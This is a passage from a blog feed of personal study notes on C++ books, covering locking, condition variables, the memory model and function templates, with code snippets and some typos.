order</strong>:<br>If you absolutely must acquire two or more locks, and you can’t acquire them as a single operation with <code>std::lock</code>, the next best thing is to acquire them in the same order in every thread.</li><li><strong>Use a lock hiearchy</strong>:<br>Although this is a particular case of defining lock ordering, a lock hierarchy can provide a means of checking that the convention is adhered to at runtime. The idea is that you divide your application into layers and identify all the mutexes that may be locked in any given layer.</li><li><strong>Extending these guidlines beyond locks</strong>:<br>Deadlocks also occur with any synchronization construct that can lead to a wait cycle.\<br>If you’re going to wait for a thread to finish, it might be worth identifying a thread hierarchy, so that a thread waits only for threads lower down the hierarchy. One simple way to do this is to ensure that your threads are joined in the same function that started them.</li></ul><h3 id="Flexible-locking-with-std-unique-lock"><a href="#Flexible-locking-with-std-unique-lock" class="headerlink" title="Flexible locking with std::unique_lock"></a>Flexible locking with <code>std::unique_lock</code></h3><p>Once you’ve designed your code to avoid deadlock, <code>std::lock()</code> and <code>std::lock_guard</code> cover most of the cases of simle locking, but sometimes more flexibility is required.</p><p><code>std::unique_lock</code> provides a bit more flexibility than <code>std::lock_guard</code> by relaxing the invariants; an <code>std::unique_lock</code> instance doesn’t always own the mutex that it’s associated with.</p><p>You can pass <code>std::adopt_lock</code> as a second argument to the constructor to have the lock object manage the lock on a mutex, you can also pass <code>std::defer_lock</code> as the second argument to indicate that the mutex should remain unlocked on construction.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">class some_big_object;<br>void swap(some_big_object&amp; lhs,some_big_object&amp; rhs);<br>class X<br>&#123;<br>private:<br>    some_big_object some_detail;<br>    std::mutex m;<br>public:<br>    X(some_big_object const&amp; sd):some_detail(sd)&#123;&#125;<br>    friend void swap(X&amp; lhs, X&amp; rhs)<br>    &#123;<br>        if (&amp;lhs == &amp;rhs)<br>            return;<br><br>        std::unique_lock&lt;std::mutex&gt; lock_a(lhs.m, std::defer_lock);<br>        std::unique_lock&lt;std::mutex&gt; lock_b(rhs.m, std::defer_lock);<br>        std::lock(lock_a, lock_b);<br>        swap(lhs.some_detail, rhs.some_detail);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>Using <code>std::unique_lock</code> and <code>std::defer_lock</code>, rather than <code>std::lock_guard</code> and <code>std::adopt_lock</code>.</p><p><code>std::unique_lock</code> objects could be passed to <code>std::lock()</code>, because <code>std::unique_lock</code> provides <code>lock()</code>, <code>try_lock()</code>, and <code>unlock()</code> member functions.</p><h3 id="Transferring-mutex-ownership-between-scopes"><a href="#Transferring-mutex-ownership-between-scopes" class="headerlink" title="Transferring mutex ownership between scopes"></a>Transferring mutex ownership between scopes</h3><p>Because <code>std::unique_lock</code> instances don’t have to own their associated mutexes, the ownership of mutex can be transferred between instances by moving the instances around.</p><h3 id="Locking-at-an-appropriate-granularity"><a href="#Locking-at-an-appropriate-granularity" class="headerlink" title="Locking at an appropriate granularity"></a>Locking at an appropriate granularity</h3><p>The lock granularity is a hand-waving term to describe the amount of data protected by a single lock. A fine-grained lock protects a small amount of data, and a coarse-grained lock protects a large amount of data.</p><h2 id="3-3-Alternative-facilities-for-protecting-shared-data"><a href="#3-3-Alternative-facilities-for-protecting-shared-data" class="headerlink" title="3.3 - Alternative facilities for protecting shared data"></a>3.3 - Alternative facilities for protecting shared data</h2><h1 id="Chapter-4-Synchronizing-concurrent-operations"><a href="#Chapter-4-Synchronizing-concurrent-operations" class="headerlink" title="Chapter.4 - Synchronizing concurrent operations"></a>Chapter.4 - Synchronizing concurrent operations</h1><p>Sometimes you don’t just need to protect the data, you also need to synchronize actions on separate threads. One thread might need to wait for another thread to complete a task before the thread can complete its own, for example. In general, it’s common to want a thread to wait for a specific event to happen or a condition to be <code>true</code>.</p><h2 id="4-1-Waiting-for-an-event-or-other-condition"><a href="#4-1-Waiting-for-an-event-or-other-condition" class="headerlink" title="4.1 - Waiting for an event or other condition"></a>4.1 - Waiting for an event or other condition</h2><p>If one thread is waiting for a second thread to complete a task, it has several options. First, it could keep checking a flag in shared data (protected by mutex) and have the second thread set the flag when it come pletes the task. This is wasteful on two counts: the thread consumes valuable processing time repeatedly checking the flag, and when the mutex is locked by the waiting thread, it can’t be locked by any other thread.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bool flags;<br>std::mutex m;<br>void wait_for_flag()<br>&#123;<br>    std::unique_lock&lt;std::mutex&gt; lk(m);<br>    std::this_thread::sleep_for(std::chrono::miliseconds(100));<br>    lk.lock();<br>&#125;<br></code></pre></td></tr></table></figure><p>In the loop, the function unlocks the mutex before the sleep, and locks it again afterward so another thread gets a chance to acquire it and set the flag.</p><p>This is an improvement because the thread does not waste processing time while it’s sleep, but it’s hard to get the sleep period right.</p><p><strong>The third and preferred option is to use the facilities from the C++ Standard Libaray to wait for the event itself</strong>.</p><h3 id="Waiting-for-a-condition-with-condition-variables"><a href="#Waiting-for-a-condition-with-condition-variables" class="headerlink" title="Waiting for a condition with condition variables"></a>Waiting for a condition with condition variables</h3><p>The Standard C++ Library provides two implementations of a condition variable: <code>std::condition_variable</code> and <code>std::condition_variable_any</code>. Both of these are declared in the <code>&lt;condition_variable&gt;</code> library header.</p><p>In both cases, they need to work with a mutex in order to provide appropriate synchronization the former is limited to working with <code>std::mutex</code>, whereas the latter can work with anything that meets the mimimal criteria for being mutex-like, hence the <code>_any</code> suffix. </p><p><code>std::condition_variable_any</code> is more general, there’s the potential for additional consts in terms of size, performance, or OS resources, so <code>std::condition_variable</code> should be preferred unless the additional flexibility is required.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::mutex mut;<br>std::queue&lt;data_chunk&gt; data_queue;<br>std::condition_variable data_cond;<br><br>void data_preparation_thread()<br>&#123;<br>    while (more_data_to_prepare())<br>    &#123;<br>        data_chunk const data = prepare_data();<br>        &#123;<br>            std::lock_guard&lt;std::mutex&gt; lk(mut);<br>            data_queue.push(data);<br>        &#125;<br><br>        data_cond.notify_one();<br>    &#125;<br>&#125;<br><br>void data_processing_thread()<br>&#123;<br>    while (true)<br>    &#123;<br>        std::unique_lock&lt;std::mutex&gt; lk(mut);<br>        data_cond.wait(<br>            lk, []&#123;return !data_queue.empty();&#125;<br>        );<br>        data_chunk data = data_queue.front();<br>        data_queue.pop();<br>        lk.unlock();<br>        process(data);<br>        if (is_last_chunk(data))<br>            break;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>You have a queue that’s used to pass the data between two therads.</li><li>Note that you put the code to push the data onto the queue in a smaller scope, so you notify the condition variable <strong>after</strong> unlocking the mutex.</li><li>On the other side of the fence, you have the processing thread. This thread first locks the mutex, but this time with a <code>std::unique_lock</code> rather than a <code>std::lock_guard</code>. The reason is <code>std::unique_lock</code> is reusable. The waiting thread must unlock the mutex while it’s waiting and lock it again afterward, and <code>std::lock_guard</code> doesn’t provide that flexibility.</li></ol><h1 id="Chapter-5-The-C-memory-model-and-operations-on-atomic-types"><a href="#Chapter-5-The-C-memory-model-and-operations-on-atomic-types" class="headerlink" title="Chapter.5 - The C++ memory model and operations on atomic types"></a>Chapter.5 - The C++ memory model and operations on atomic types</h1><p>This chapter will start by convering the basic of the memory model, then move on to the atomic types and operations, and finally cover the various types of synchronization available with the operations on atomic types.</p><h2 id="5-1-Memory-model-basic"><a href="#5-1-Memory-model-basic" class="headerlink" title="5.1 - Memory model basic"></a>5.1 - Memory model basic</h2><h3 id="Objects-and-memory-locations"><a href="#Objects-and-memory-locations" class="headerlink" title="Objects and memory locations"></a>Objects and memory locations</h3><p>The C++ Standard defines an object as “a region of storage”, although it goes on to assign properties to these objects, such as their type and lifetime.</p><p>Whatever its type, an object is stored in one or more <strong>memory locations</strong>. Each memory location is either an object (or sub-object) of a scalar type such as <code>unsigned short</code> or <code>my_class*</code> or a sequence of adjacent bit fields. If you use bit fields, this is an important point to note: though adjacent bit fields are distinct objects, they’re still counted as the same memory location.</p><p align="center" class='item-img' data-src='/images/books/CppConcurrency/fig5.1.png'><img src="/images/books/CppConcurrency/fig5.1.png" width="400"></p><p>There are four important things to take away from this:</p><ol><li>Every variable is an object, including those that are members of other objects.</li><li>Every object occupies <strong>at least one</strong> memory location.</li><li>Variables of fundamental types such as <code>int</code> or <code>char</code> occupy exactly <strong>one</strong> memory location, whatever their size, even if they’re adjacent or part of an array.</li><li>Adjacent bit fields are part of the same memory location.</li></ol><h3 id="Objects-memory-locations-and-concurrency"><a href="#Objects-memory-locations-and-concurrency" class="headerlink" title="Objects, memory locations and concurrency"></a>Objects, memory locations and concurrency</h3><p>If two threads access <strong>separate</strong> memory locations, there’s no problem: everything works fine. On the other hand, if two threads access the <strong>same</strong> memory location, then you have to be careful.\<br>If neither thread is updating the memory location, you’re fine; read-only data does not need protection or synchronization.<br>If either thread is modifying the data, there’s a potential for a race condition.</p><p>Solutions:</p><ol><li>mutexes.</li><li>Synchronization properties of <strong>atomic</strong> operations.</li></ol><p>If two threads access the same memory location, each pair of accesses must have a defined ordering.</p><p>If there’s no enofrced ordering between two accesses to a single memory location from separate threads, one or both of those accesses is no atomic, and if one or both is a write, then this is a data race and causes undefined behavior.</p><h3 id="Modification-orders"><a href="#Modification-orders" class="headerlink" title="Modification orders"></a>Modification orders</h3><p>If you do use atomic operations, the compiler is responsible for ensuring that the necessary synchronization is in place.\<br>This requirement means that certain kinds of speculative execution ain’t permitted, because once a thread has seen a particular entry in the modification order, subsequent reads from that thread must return laster values, and subsequent writes from that thread to that object must occur laster in the modification order.</p><h2 id="5-2-Atomic-operations-and-types-in-C"><a href="#5-2-Atomic-operations-and-types-in-C" class="headerlink" title="5.2 - Atomic operations and types in C++"></a>5.2 - Atomic operations and types in C++</h2><p>An <strong>atomic operation</strong> is an indivisible operation. You can’t observe such an operation half-done from any thread in the system; it’s either done or not done.</p><p>If the load operation that reads the value of an object is <strong>atomic</strong>, and all modifications to that object are also <strong>atomic</strong>.</p><p>The flip side of this is that a non-atomic operation might be seen as half-done by another thread. If the non-atomic operation is composed of atomic operaitons (for example, assignment to <code>struct</code> with <code>atomic</code> members), then other threads may observe some sbuset of the constituent atomic operation as complete, but others as not yet started, so you might observe or end up with a value that is a mixed-up combination<br>of the various values stored.</p><h3 id="The-standard-atomic-types"><a href="#The-standard-atomic-types" class="headerlink" title="The standard atomic types"></a>The standard atomic types</h3><p>The standar <strong>atomic types</strong> can be found in the <code>&lt;atomic&gt;</code> header. All operations on such types are atomic, and only operations on these types are atomic in the sense of the language definition, although you can use mutexes to make other operation <strong>appear</strong> atomic.</p><h1 id="Chapter-6-Designing-lock-based-concurrent-data-structures"><a href="#Chapter-6-Designing-lock-based-concurrent-data-structures" class="headerlink" title="Chapter.6 - Designing lock-based concurrent data structures"></a>Chapter.6 - Designing lock-based concurrent data structures</h1><h1 id="Chapter-7-Designing-lock-free-concurrent-data-structures"><a href="#Chapter-7-Designing-lock-free-concurrent-data-structures" class="headerlink" title="Chapter.7 - Designing lock-free concurrent data structures."></a>Chapter.7 - Designing lock-free concurrent data structures.</h1><h1 id="Chapter-8-Designing-concurrent-code"><a href="#Chapter-8-Designing-concurrent-code" class="headerlink" title="Chapter.8 - Designing concurrent code"></a>Chapter.8 - Designing concurrent code</h1><h1 id="Chapter-10-Advanced-thread-management"><a href="#Chapter-10-Advanced-thread-management" class="headerlink" title="Chapter.10 - Advanced thread management"></a>Chapter.10 - Advanced thread management</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-Libro&quot;&gt;&lt;a href=&quot;#El-Libro&quot; class=&quot;headerlink&quot; title=&quot;El Libro&quot;&gt;&lt;/a&gt;El Libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    <category term="Book" scheme="http://example.com/categories/Book/"/>
    
    
    <category term="Book" scheme="http://example.com/tags/Book/"/>
    
    <category term="Learning" scheme="http://example.com/tags/Learning/"/>
    
    <category term="Study" scheme="http://example.com/tags/Study/"/>
    
    <category term="Note" scheme="http://example.com/tags/Note/"/>
    
    <category term="Programming" scheme="http://example.com/tags/Programming/"/>
    
    <category term="C++" scheme="http://example.com/tags/C/"/>
    
    <category term="Coding" scheme="http://example.com/tags/Coding/"/>
    
    <category term="Concurrency" scheme="http://example.com/tags/Concurrency/"/>
    
  </entry>
  
  <entry>
    <title>[Book] C++ Templates - The Complete Guide (Second Edition)</title>
    <link href="http://example.com/2026/01/07/2026-1-7-CppTemplatesTheCompleteGuide2ed/"/>
    <id>http://example.com/2026/01/07/2026-1-7-CppTemplatesTheCompleteGuide2ed/</id>
    <published>2026-01-07T06:38:34.000Z</published>
    <updated>2026-01-15T09:22:53.607Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/CppTemplate/libro.png'><img src="/images/books/CppTemplate/libro.png" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “C++ Templates - The Complete Guide (Second Edition)”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-1-Function-Templates"><a href="#Chapter-1-Function-Templates" class="headerlink" title="Chapter.1 - Function Templates"></a>Chapter.1 - Function Templates</h1><h2 id="1-1-Function-Templates"><a href="#1-1-Function-Templates" class="headerlink" title="1.1 - Function Templates"></a>1.1 - Function Templates</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>T max(T a, T b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><p>template parameters must be announced with syntax of the following form:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;comma-separated-list of parameters&gt;<br></code></pre></td></tr></table></figure><br>Here, the type parameter is <strong>T</strong>. You can use any identifier as a parameter name, but using <strong>T</strong> is the convention. The type parameter represents an arbitrary type that is determined by the caller when the caller calls the function.</p><p>For historical reasons, you can also use the keyworkd <em>class</em> instead of <em>typename</em> to define a type parameter.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;class T&gt;<br>T max(T a, T b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><br>Semantically there is no difference. However, because this use of <em>class</em> can be misleading(not only class types can be substituted for <strong>T</strong>), you should prefer the use of <em>typename</em> in this context.<br>The keyword <em>struct</em> cannot be used in place of <em>typename</em> when declaring type parameters.</p><p>Example of using max() function template:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;iostream&gt;<br>#include &lt;string&gt;<br>#include &quot;max1.hpp&quot;<br><br>int main()<br>&#123;<br>  int i = 42;<br>  std::cout &lt;&lt; &quot;max(7, i): &quot; &lt;&lt; ::max(7, i) &lt;&lt; std::endl;<br><br>  double f1 = 3.4;<br>  double f2 = -6.7;<br>  std::cout &lt;&lt; &quot;max(f1, f2): &quot; &lt;&lt; ::max(f1, f2) &lt;&lt; std::endl;<br><br>  std::string s1 = &quot;mathematics&quot;;<br>  std::string s2 = &quot;math&quot;;<br>  std::cout &lt;&lt; &quot;max(s1, s2): &quot; &lt;&lt; ::max(s1, s2) &lt;&lt; std::endl;<br>&#125;<br></code></pre></td></tr></table></figure><br>Output:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">max(7,i): 42<br>max(f1,f2): 3.4<br>max(s1,s2): mathematics<br></code></pre></td></tr></table></figure><br>Note that each call of the <em>max()</em> template is qualified with <em><strong>::</strong></em>. This is to ensure that our <em>max()</em> template is found in the global namespace. This is also a <em>std::max()</em> template in the standard libaray, which under some circumstances may be called or maylead to ambiguity.</p><p><em>void</em> is a valid template argument provided the resulting code is valid:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>T foo(T*)<br>&#123;<br><br>&#125;<br><br>void *vp = nullptr;<br>foo(vp); //OK<br>//foo(void*); NOT OK<br></code></pre></td></tr></table></figure></p><h3 id="Two-Phase-Translation"><a href="#Two-Phase-Translation" class="headerlink" title="Two-Phase Translation"></a>Two-Phase Translation</h3><p>An attempt to instantiate a template for a type that doesn’t support all the operations used within it will result in a compile-time error:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">std::complex&lt;flat&gt; c1, c2; //doesn&#x27;t provide operator &lt;<br>...<br>::max(c1, c2);<br></code></pre></td></tr></table></figure><br>templates are <strong>compiled</strong> in two phase:</p><ol><li>Without instantiation at <strong>definition time</strong>, the template code itself is checked for correctness ignoring the template parameters:<ol><li>Syntax errors.</li><li>Using unknown names.</li><li>Static assertions that don’t depend on template parameters are checked.</li></ol></li><li>At <em>instantiation time</em>, the template code is checked(again) to ensure that all code is valid.</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>void foo(T t)<br>&#123;<br>  undeclared(); // first-phase compile-time error if undeclared() unknown<br>  undeclared(t); // second-phase compile-time error if undeclared(T) unknown<br>  static_assert(sizeof(int) &gt; 10, // always fails if sizeof(int)&lt;=10 &quot;int too small&quot;);<br>  static_assert(sizeof(T) &gt; 10, //fails if instantiated for T with size &lt;=10 &quot;T too small&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-Template-Arugment-Deduction"><a href="#1-2-Template-Arugment-Deduction" class="headerlink" title="1.2 - Template Arugment Deduction"></a>1.2 - Template Arugment Deduction</h2><p>Automatic type conversions are limited during type deduction:</p><ul><li>When declaring call parameters by reference, even trivial conversions do not apply to type deduction. Two arguments declared with the same template parameter T <strong>must match exactly</strong>.</li><li>When declaring call parameters by value, only trivial conversions that <em>decay</em> are supported: Qualifications with <strong>const</strong> or <strong>volatile</strong> are ignored, references convert to the referenced type, and raw arrays or functions convert to the corresponding pointer type.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>T max (T a, T b);<br>… <br>int const c = 42;<br>max(i, c); // OK: T is deduced as int<br>max(c, c); // OK: T is deduced as int<br>int&amp; ir = i;<br>max(i, ir); // OK: T is deduced as int<br>int arr[4];<br>foo(&amp;i, arr); // OK: T is deduced as int*<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">max(4, 7.2); //ERROR: T can be deduced as int or double<br>std::string s;<br>foo(&quot;Hello&quot;, s); //ERROR: T can be deduced as char const[6] or std::string<br></code></pre></td></tr></table></figure><p>There are three ways to handle such errors:</p><ol><li>Cast the arguments so that they both match:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">max(static_cast&lt;double&gt;(4), 7.2);<br></code></pre></td></tr></table></figure></li><li>Specify(or qualify) explicity the type of <strong>T</strong> to prevent the compiler from attempting type deduction:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">max&lt;double&gt;(4, 7.2);<br></code></pre></td></tr></table></figure></li><li>Specify that the parameters may have different types.</li></ol><p>Type Deduction for Default Arguments<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T&gt;<br>void f(T = &quot;&quot;);<br><br>f(1); //OK: deduced T to be int, so that it calls f&lt;int&gt;(1)<br>f(); //ERROR: cannot deduce T<br></code></pre></td></tr></table></figure><br>To support this case:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T = std::string&gt;<br>void f(T = &quot;&quot;);<br>...<br><br>f(); //OK<br></code></pre></td></tr></table></figure></p><blockquote><p>Important: <strong>Template argument deduction is performed before default arguments are considered</strong>.</p></blockquote><h2 id="1-3-Multiple-Template-Parameters"><a href="#1-3-Multiple-Template-Parameters" class="headerlink" title="1.3 - Multiple Template Parameters"></a>1.3 - Multiple Template Parameters</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>T1 max (T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b; <br>&#125;<br>… <br>auto m = ::max(4, 7.2); // OK, but type of first argument defines return type<br></code></pre></td></tr></table></figure><h3 id="Template-Parameters-for-Return-Types"><a href="#Template-Parameters-for-Return-Types" class="headerlink" title="Template Parameters for Return Types"></a>Template Parameters for Return Types</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2, typename RT&gt;<br>RT max (T1 a, T2 b);<br></code></pre></td></tr></table></figure><p>However, template argument deduction does not take return types into account, and <strong>RT</strong> does not appear in the types of the function call parameters. Therefore, <strong>RT</strong> cannot be deduced.</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2, typename RT&gt;<br>RT max (T1 a, T2 b);<br>…<br>::max&lt;int,double,double&gt;(4, 7.2); // OK, but tedious<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename RT, typename T1, typename T2&gt;<br>RT max (T1 a, T2 b);<br>…<br>::max&lt;double&gt;(4, 7.2) //OK: return type is double, T1 and T2 are deduced<br></code></pre></td></tr></table></figure><h3 id="Deducing-the-Return-Type"><a href="#Deducing-the-Return-Type" class="headerlink" title="Deducing the Return Type"></a>Deducing the Return Type</h3><p>Since C++14, this is possible by simply not declaring any return type(you still have to declare the return type to be <strong>auto</strong>):<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>auto max(T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>Before C++14, it is only possible to let the compiler determine the return type by more or less making the implementation of the function part of its declaration. In C++11 we can benefit from the fact that the trailing return type syntax allows us to use the call parameters. That is, we can declare that the return type is derived from what operator?: yields:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>auto max(T1 a, T2 b) -&gt; decltype(b &lt; a ? a : b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">template&lt;typename T1, typename T2&gt;<br>auto max(T1 a, T2 b) -&gt; decltype(b&lt;a?:a:b);<br></code></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;type_traits&gt;<br>template&lt;typename T1, typename T2&gt;<br>auto max(T1 a, T2 b) -&gt; typename std::decay&lt;decltype(true ? a : b)&gt;::type<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="1-4-Default-Template-Arguments"><a href="#1-4-Default-Template-Arguments" class="headerlink" title="1.4 - Default Template Arguments"></a>1.4 - Default Template Arguments</h2><p>You can also define values for template parameters. These values are called <strong>default template arguments</strong> and can be used with any kind of template.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;type_traits&gt;<br>template&lt;typename T1, typename T2, typename RT = std::decay_t&lt;decltype(trye ? T1() : T2())&gt;&gt;<br>RT max(T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br></code></pre></td></tr></table></figure><p>Note again the usage of <code>std::decay_t&lt;&gt;</code> to ensure that no reference cna be returned.</p><p>Note also that this implementation requires that we are able to call default constructors for the passed types. There is another solution, using <code>std::declval</code>, which, however, <strong>make the declaration even more complicated</strong>(Section 11.2.3)</p><p>We can also use the <code>std::common_type&lt;&gt;</code> type trait to specify the default value for the return type:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;type_traits&gt;<br><br>template&lt;typename T1, typename T2, typename RT = std::common_type_t&lt;T1, T2&gt;&gt;<br>RT max(T1 a, T2 b)<br>&#123;<br>  return b &lt; a ? a : b;<br>&#125;<br><br>auto a = ::max(4, 7.2);<br>auto b = ::max&lt;double, int, long double&gt;(7.2, 4);<br></code></pre></td></tr></table></figure><br>However, again we have the problem that we have to specify three types to be able to specify the return type only.  </p><p>We would need the ability to have the return type as the first template parameter, while still begin able to deduce it from the argument types.  </p><p>It is possible to have default arguments for leading function template parameters even if parameters without default arguments follow:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 